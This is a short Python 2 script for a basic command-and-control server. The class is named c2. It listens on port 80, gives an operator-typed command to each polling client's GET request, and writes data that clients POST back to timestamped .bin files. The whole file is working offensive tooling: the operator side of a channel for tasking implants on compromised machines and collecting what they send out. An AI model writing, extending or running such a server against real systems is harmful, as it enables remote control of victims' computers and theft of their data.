from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from colorama import init, Fore, Back, Style
import datetime

init()
cmd = ""
class c2(BaseHTTPRequestHandler):
	def _set_headers(self):
		self.send_response(200)
		self.send_header('Content-type', 'text/html')
		self.end_headers()

	def do_GET(self):
		print(Fore.YELLOW + "Recieved GET request: " + self.path)
		print(Fore.YELLOW + "Sending command: " + cmd)
		print(Style.RESET_ALL)
		self._set_headers()
		self.wfile.write(cmd)
		# Clear command
		global cmd
		cmd = ""

	def do_HEAD(self):
		self._set_headers()

	def do_POST(self):
		content_length = int(self.headers['Content-Length'])  # <--- Gets the size of data
		post_data = self.rfile.read(content_length)  # <--- Gets the data itself
		print( Fore.GREEN + "Recieved: " + str(post_data))
		
		now = datetime.datetime.now()
		filename = now.strftime("%Y-%m-%d_%H_%M_%f") + "_uploadedFile.bin" 
		open(filename,'wb').write(str(post_data))
		print( Fore.GREEN + "This output has been written to file: " + filename)
		print(Style.RESET_ALL)
		
		self._set_headers()
		self.wfile.write("<html><body><h1>POSTed!</h1></body></html>")


server_address = ('', 80)
httpd = HTTPServer(server_address, c2)
print('Starting httpd...')
while True:
	cmd = raw_input("Enter Command: ")
	httpd.handle_request()
	while cmd != "":
		httpd.handle_request()
	print("> Command Sent!")